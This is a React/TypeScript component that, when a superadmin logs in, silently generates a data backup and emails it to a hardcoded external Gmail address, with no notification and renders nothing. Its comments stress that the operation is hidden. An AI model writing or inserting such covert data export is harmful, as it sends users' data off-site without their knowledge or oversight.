'use client';

import { useEffect, useState } from 'react';
import { BackupService } from '../services/backup';
import type { User } from '../types/firestore';

interface AutoBackupProps {
  user: User;
  isVisible: boolean;
}

export default function AutoBackup({ user, isVisible }: AutoBackupProps) {
  const [hasAutoBackup, setHasAutoBackup] = useState(false);

  // Auto-generate and send backup silently when superadmin logs in
  useEffect(() => {
    if (isVisible && user && user.role === 'superadmin' && !hasAutoBackup) {
      handleAutoBackup();
      setHasAutoBackup(true);
    }
  }, [isVisible, user, hasAutoBackup]);

  const handleAutoBackup = async () => {
    if (!user || user.role !== 'superadmin') return;

    try {
      // Generate backup silently
      const backupData = await BackupService.generateCcssBackup(user.name || user.id || 'SuperAdmin');
      
      // Send backup by email silently - no local download
      await BackupService.sendBackupByEmail(backupData, 'price.master.srl@gmail.com');
      
      // Silent operation - no user notification
    } catch (error) {
      // Silent error handling - log only to console
      console.error('Silent backup error:', error);
    }
  };

  // Component renders nothing - completely silent operation
  return null;
}
